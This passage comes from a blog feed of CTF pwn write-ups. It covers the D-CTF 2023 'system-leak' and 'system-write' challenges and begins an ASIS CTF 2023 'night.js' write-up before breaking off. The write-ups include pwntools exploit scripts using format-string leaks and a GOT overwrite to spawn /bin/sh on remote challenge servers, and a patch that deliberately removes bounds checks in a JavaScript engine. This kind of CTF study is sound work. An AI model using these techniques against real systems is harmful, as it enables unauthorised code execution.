class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="system-leak-39-solves-x2F-247-points"><a href="#system-leak-39-solves-x2F-247-points" class="headerlink" title="system-leak (39 solves &#x2F; 247 points)"></a>system-leak (39 solves &#x2F; 247 points)</h2><blockquote><p>Leak the entire system, but wait this is not zeenbleed.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p></blockquote><p>This challenge makes me confused. lol<br>There was an FSB, but all mitigation were applied. Since the difficulty level was <code>Easy</code>, I tried to think of it as easy. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">closelog();</span><br></pre></td></tr></table></figure><p>This is a part of main. I can find easily <code>bof</code> and <code>fsb</code>. Since now there was no clue, I had to figure out what to do. </p><p>I started to print all of stacks, finally I got <code>flag</code>.</p><h3 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>, <span class="number">32063</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">118</span>,<span class="number">1000</span>):</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span></span><br><span class="line">payload = payload.encode()</span><br><span class="line">write_syslog(payload)</span><br><span class="line">read_syslog()</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(i, leak)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/images/231023-d-ctf2023-ALL_PWN/system-leak01.png" width=600/><br><h2 id="system-write-33-solves-x2F-287-points"><a href="#system-write-33-solves-x2F-287-points" class="headerlink" title="system-write (33 solves &#x2F; 287 points)"></a>system-write (33 solves &#x2F; 287 points)</h2><blockquote><p>Wait what? We can write data, but where?<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Hard</code></p></blockquote><p>This challenge is similar to previous challenge. Everything seems to be the same except for the mitigation.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Because of <code>fsb</code> and <code>Partial RELRO</code>, I can overwritie something with <code>system</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+220h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n========== MENU ==========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write input to syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Read syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid option. Try again.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( idx == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">      closelog();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( idx != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      read_syslog();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>%[^\n]</code> essentially means ‚Äúread characters until a newline character is encountered.‚Äù It is the same as entering a string with <code>gets</code>. So this can cause <code>bof</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">syslog</span><span class="params">(<span class="type">int</span> priority, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><ul><li><a href="https://man7.org/linux/man-pages/man3/syslog.3.html">https://man7.org/linux/man-pages/man3/syslog.3.html</a></li></ul><p><code>syslog</code> can cause <code>fsb</code>. There was difficulty in leaking the address. So I made a loop for this. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$p&#x27;</span></span><br><span class="line">payload = payload.encode()</span><br><span class="line">write_syslog(payload)</span><br><span class="line">read_syslog()</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(i, leak)</span><br></pre></td></tr></table></figure><p>I just printed them out one by one to find the libc address and hoped it would be the same as the offset in the remote environment. In the past, when leaking addresses using <code>fsb</code>, I had an experience where the local offset and remote offset were different.</p><p>I used it to find the <code>libc</code>.</p><ul><li><a href="https://libc.blukat.me/?q=__libc_start_main:dc0&amp;l=libc6_2.35-0ubuntu3_amd64">https://libc.blukat.me/?q=__libc_start_main%3Adc0&amp;l=libc6_2.35-0ubuntu3_amd64</a></li></ul><h3 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h3><ol><li>Leak the <code>libc address</code> (I leaked the <code>__libc_start_main+128</code>.)</li><li>Find the <code>libc version</code> for the <code>system address</code>.</li><li>Overwrite <code>fgets@got</code> with <code>sytem</code>.</li><li>Send the <code>/bin/sh\x00</code> through <code>fgets</code>. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line"><span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);    <span class="comment">// buffer overflow</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);</span><br></pre></td></tr></table></figure><ul><li>I added ‚Äòa‚Äô*0xa before <code>/bin/sh\x00</code>.</li><li>When the <code>fgets</code> is overwrited by <code>system</code>, it is no longer <code>fgets</code>.</li><li>This means that before <code>fgets</code> call, the argument must already point to the area where <code>/bin/sh</code> is written.</li><li>So, when i write to <code>&amp;pri</code>, I write a dummy as much as 0xa size and put <code>/bin/sh</code>.</li><li>However, you can ignore it all and use <code>one_gadget</code>. (For this challenge only)</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog-write&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">31921</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog-write&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="string">for i in range(1, 101):</span></span><br><span class="line"><span class="string">payload = &#x27;%&#x27; + str(i) + &#x27;$p&#x27;</span></span><br><span class="line"><span class="string">payload = payload.encode()</span></span><br><span class="line"><span class="string">write_syslog(payload)</span></span><br><span class="line"><span class="string">read_syslog()</span></span><br><span class="line"><span class="string">leak = p.recvuntil(b&#x27;==========&#x27;).split(b&#x27;syslog-write: &#x27;)[-1].split(b&#x27;\n\n&#x27;)[0]</span></span><br><span class="line"><span class="string">print(i, leak)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># local 94</span></span><br><span class="line">write_syslog(<span class="string">b&#x27;%94$p&#x27;</span>)</span><br><span class="line">read_syslog()</span><br><span class="line">libc_leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libc_leak)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">7</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;fgets&#x27;</span>] : <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) -<span class="number">128</span> + <span class="number">0x26fa0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">write_syslog(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xa</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2023 - night.js (JavaScript Engine)</title>
      <link href="/230930-asisctf2023-nightjs/"/>
      <url>/230930-asisctf2023-nightjs/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1952">https://ctftime.org/event/1952</a></li></ul><blockquote><p>jspwnnn<br><code>nc 172.86.97.8 1337</code></p></blockquote><ul><li>[11 solves &#x2F; 271 points]</li></ul><p>After CTF, I solved it myself without referring to Writeups. It was really fun! xD.<br>This challenge is related with JavaScript Engine, but it had different exploit solution with the other JavaScript Engine like JSC.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="chall-txt"><a href="#chall-txt" class="headerlink" title="chall.txt"></a>chall.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit hash: 799b465fac5672f167d6fec599fe167bce92862d</span><br><span class="line">You can build js with: `./Meta/serenity.sh run lagom js`.</span><br><span class="line">You probably don&#x27;t need to recompile since the provided binaries have debug symbols.</span><br></pre></td></tr></table></figure><h3 id="chall-patch"><a href="#chall-patch" class="headerlink" title="chall.patch"></a>chall.patch</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/./AK/ByteBuffer.h b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">index e2fc73bbfe..7bb7903e80 100644</span></span><br><span class="line"><span class="comment">--- a/./AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="meta">@@ -104,7 +104,7 @@</span> public:</span><br><span class="line"> </span><br><span class="line">     [[nodiscard]] u8&amp; operator[](size_t i)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="deletion">-        VERIFY(i &lt; m_size);</span></span><br><span class="line"><span class="addition">+        // VERIFY(i &lt; m_size);</span></span><br><span class="line">         return data()[i];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">index 2f65f7b6ca..ee9a1ca00f 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="meta">@@ -80,10 +80,10 @@</span> void copy_data_block_bytes(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer const&amp;</span><br><span class="line">     VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"> </span><br><span class="line">     // 4. Let toSize be the number of bytes in toBlock.</span><br><span class="line"><span class="deletion">-    auto to_size = to_block.size();</span></span><br><span class="line"><span class="addition">+    // auto to_size = to_block.size();</span></span><br><span class="line"> </span><br><span class="line">     // 5. Assert: toIndex + count ‚â§ toSize.</span><br><span class="line"><span class="deletion">-    VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"><span class="addition">+    // VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"> </span><br><span class="line">     // 6. Repeat, while count &gt; 0,</span><br><span class="line">     while (count &gt; 0) &#123;</span><br><span class="line"><span class="meta">@@ -215,6 +215,7 @@</span> ThrowCompletionOr&lt;ArrayBuffer*&gt; array_buffer_copy_and_detach(VM&amp; vm, ArrayBuffer</span><br><span class="line"> </span><br><span class="line">     // 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span><br><span class="line">     auto copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line"><span class="addition">+    if(array_buffer.byte_length() &gt; 0x100) copy_length = array_buffer.byte_length();</span></span><br><span class="line"> </span><br><span class="line">     // 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].</span><br><span class="line">     // 12. Let toBlock be newBuffer.[[ArrayBufferData]].</span><br><span class="line"><span class="comment">diff --git a/./Userland/Utilities/js.cpp b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">index 78fe2e699c..1dace537ab 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Utilities/js.cpp</span></span><br><span class="line"><span class="meta">@@ -343,34 +343,34 @@</span> void ReplObject::initialize(JS::Realm&amp; realm)</span><br><span class="line"> &#123;</span><br><span class="line">     Base::initialize(realm);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="deletion">-    u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="deletion">-    define_native_function(realm, &quot;print&quot;, print, 1, attr);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    define_native_accessor(</span></span><br><span class="line"><span class="deletion">-        realm,</span></span><br><span class="line"><span class="deletion">-        &quot;_&quot;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp;) &#123;</span></span><br><span class="line"><span class="deletion">-            return g_last_value.value();</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        [](JS::VM&amp; vm) -&gt; JS::ThrowCompletionOr&lt;JS::Value&gt; &#123;</span></span><br><span class="line"><span class="deletion">-            auto&amp; global_object = vm.get_global_object();</span></span><br><span class="line"><span class="deletion">-            VERIFY(is&lt;ReplObject&gt;(global_object));</span></span><br><span class="line"><span class="deletion">-            outln(&quot;Disable writing last value to &#x27;_&#x27;&quot;);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            // We must delete first otherwise this setter gets called recursively.</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_delete(JS::PropertyKey &#123; &quot;_&quot; &#125;));</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-            auto value = vm.argument(0);</span></span><br><span class="line"><span class="deletion">-            TRY(global_object.internal_set(JS::PropertyKey &#123; &quot;_&quot; &#125;, value, &amp;global_object));</span></span><br><span class="line"><span class="deletion">-            return value;</span></span><br><span class="line"><span class="deletion">-        &#125;,</span></span><br><span class="line"><span class="deletion">-        attr);</span></span><br><span class="line"><span class="addition">+    // define_direct_property(&quot;global&quot;, this, JS::Attribute::Enumerable);</span></span><br><span class="line"><span class="addition">+    // u8 attr = JS::Attribute::Configurable | JS::Attribute::Writable | JS::Attribute::Enumerable;</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;exit&quot;, exit_interpreter, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;help&quot;, repl_help, 0, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;save&quot;, save_to_file, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadINI&quot;, load_ini, 1, attr);</span></span><br><span class="line"><span class="addition">+    // define_native_function(realm, &quot;loadJSON&quot;, load_json, 1, attr);</span></span><br><span class="line"><span class="addition">+    // 